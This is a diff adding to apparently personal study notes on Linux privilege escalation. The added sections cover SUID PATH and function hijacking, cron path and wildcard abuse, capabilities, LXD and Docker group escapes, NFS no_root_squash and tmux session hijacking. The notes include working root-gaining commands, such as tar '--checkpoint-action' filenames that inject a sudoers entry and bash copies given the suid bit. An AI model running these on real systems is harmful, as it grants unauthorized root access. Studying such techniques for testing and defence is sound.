@@ -51,10 +51,12 @@ https://github.com/saleemrashid/sudo-cve-2019-18634
 Always specify absolute path to any binaries, otherwise PATH abuse.  
 
 ### 3. Special permissions: setuid and setgid  
+https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits  
 setuid allows program/script to be run with permissions of owner of the file typically with elevated privs..  
 setuid bit appears as an s instead of x in owner perms  -rwsr-xr-x  
 find / -perm -4000 -type f 2>/dev/null -ls //suid  
 find / -perm -2000 -type f 2>/dev/null -ls //sgid  
+Sticky bits: when set others can't delete the user files. Good for /tmp - so can't delete other users files.  
 // next use GTFO bins to see if any unusual    
 Exploitables: systemctl, tcpdump, vim etc  
 //suid is set on passwd doesn't work - why ? because passwd not vul and doesn;t allow shell escape ?  
@@ -71,6 +73,20 @@ Look for any files that you can write.. In this case /home/user/.config/libcalc.
 --- just create a file and run executable again – it should catch your file and run it !  
 Search for c shell code !! Compile it and place it in that directory with that name !!  
 
+#### SUID escalation via Environment variable       
+find / -type f -perm -4000 -ls 2>/dev/null   
+say custom binary with no gtfo exploit.. no shared injection  
+strings /usr/local/bin/suid-env  //try check if its calling something inside,  
+so this is running service apache2 start command – no full path for service  
+place a malicious service in tmp and add tmp to PATH 
+export PATH=/tmp:$PATH  //running suid exe should now refer malicious service giving elevated bash  
+Say, full path is in use /usr/bin/service apache2 start  
+//can declare a function of that name /usr/bin/service and add it to env variable which gets run on suid file exe  
+function /usr/bin/service() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }  
+export -f /usr/bin/service  //exporting the function as env varia  
+//running the suid binary now gives an elevated bash !!  
+Question around this -- what's the root cause here ? how define any such calls in suid files ?  
+
 #### Escalation via Binary Symlinks  
 one of the tests, cron jobs had a symlink run by root - not vulnerable, as symlink dire was not writable  
 vulnerable if can change/update symlinks - need write perms - can maybe make it point to then run bin/bash instead ?   
@@ -79,6 +95,89 @@ exploit: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-
 nginx issue: ss –la /var/log/nginx  - dir owned by web user www-data - replace a file here with a symlink and restart nginx 
 Upon nginx startup/restart the logs would be written to the file pointed to  ..hence the vulnera  
 requires: vulnerable nginx version <=1.6.2 and suid on sudo which is always the case  
+
+### 4. Capabilities  
+Linux capabilities are kernel-level permissions, A process/binary can run as non-root but still perform certain privileged operations.  
+For example, if the cap_net_bind_service capability is set for a binary,    
+the binary will be able to bind to network ports, which is a privilege usually restricted.  
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;  
+getcap –r / 2>dev/null      //look everywhere  
+dangerous capabilities: cap_setuid+ep(similar to cloud setiampolicy), cap_dac_override and many others  
+https://tbhaxor.com/exploiting-linux-capabilities-part-2/  
+
+### 5. Privileged Group memberships:  id  
+if member of following privileged groups: LXC/LXD, Docker, ADM  
+LXC/LXD, Docker group - can create a new container mounting /root of host  
+ADM group - allows to read all logs in /var/log - leveraged to gather sensi data stored  
+
+## Service based privesc  
+### 1. Vulnerable Services:  
+screen terminal multiplexer version 4.5.0 has priv esc vul due to lack of permission check when opening a log file.  
+screen –v  
+./screen_exploit.sh  
+### 2. Cron job abuse  
+#### Escalation via Cron Paths  
+cat /etc/crontab -- /home/user is a valid path in crontab, cronjob run overwrite.sh  
+but with no full path, place a malicious overwrite.sh in /home/user - gets run giving elevated bash  
+cp /bin/bash /tmp/bash; chmod +s /tmp/bash   //copy and set sid - good payload  
+#### Escalation via Cron File Overwrites  
+if file run by root in cronjob is writable - just put your own shell in it or copy bash into /tmp and set suid  
+#### Escalation via Cron Wildcards  
+\* , ?, [ ], ~ , -        //some common wildcards to do file/character replacements.  
+say there is a cron job that backups all files in folder using * as the wildcard using tar command !  
+can be in compress.sh or direct command \*/01 \* \* \* \* cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz \*  
+We can leverage the wild card in the cron job to write out the necessary commands as file names  
+When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.  
+htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh   //make root.sh executable  
+htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"  
+htb-student@NIX02:~$ echo "" > --checkpoint=1  
+This creates 2 empty files with checkpoint action and checkpoint and the action executes root.sh file  
+which contains echo script to write to sudoers file to give all permissions to the user !!  
+
+Systemd timers  //simialr to cronjobs ??  
+Systemctl list-timers –all       //will list all timers  
+
+### 3. LXD: LXC/LXD group membership.   
+If we can't Download a container, check the image templates already avaialble on the system.  
+cd ContainerImages  
+lxc image import ubuntu-template.tar.xz --alias ubuntutemp  
+lxc image list       //imports the image  
+lxc init ubuntutemp privesc -c security.privileged=true  
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true  
+//mounts the root filesystem to container and accessing it  
+lxc start privesc  
+lxc exec privesc /bin/bash  
+ls -l /mnt/root  
+
+### 4. Docker  
+#### Member of Docker group  
+docker run -v /:/mnt --rm -it bash chroot /mnt sh    //bash instead of alpine  
+#### Docker Shared library    
+#### docker.sock exposed  
+
+### 7. Miscellaneous techniques  
+#### Tcpdump: if can run tcpdump, capture traffic and analyze for any creds in cleartext protocols.  
+#### Weak NFS privileges: NFS port 2049  
+showmount -e 10.129.2.12     //list accessible mounts on target server  
+cat /etc/exports      //check if no_root_squash is set for filesystems exportable to NFS clients  
+Remote users connecting to the share as the local root user will be able to create files  
+on the NFS server as the root user. exploit by creating malicious scripts/programs with the SUID bit set.  
+//problem here, sid bit stays on remote nfs, running it runs as root  
+sudo mount -t nfs 10.129.2.12:/tmp /mnt   //mount the nfs -  be a root user.  
+cp shell /mnt    //copy revshell or any payload    
+Chmod u+s /mnt/shell  //suid bit setting  
+Now switch back to the target and run the shell to get escalated privilege !  
+#### Hijacking Tmux Sessions: read more    
+a user may leave a tmux process running as a privileged user,  
+such as root set up with weak permissions, and can be hijacked. By creating a shared session and modifying ownership.  
+tmux -S /shareds new -s debugsess  
+chown root:devs /shareds  
+ps aux | grep tmux  //check for tmux sessions  
+ls -la /shareds  
+id     //check our group member part of dev group  
+tmux –S /shareds   //attach to the shared tmus session and confirm root privileges  
+dd  
+
 
 ## Kernel Exploits:  Kernel is an interface between software and hardware.  
 Note: Kernel exploits can cause system instability so use caution when running these against a production system.  
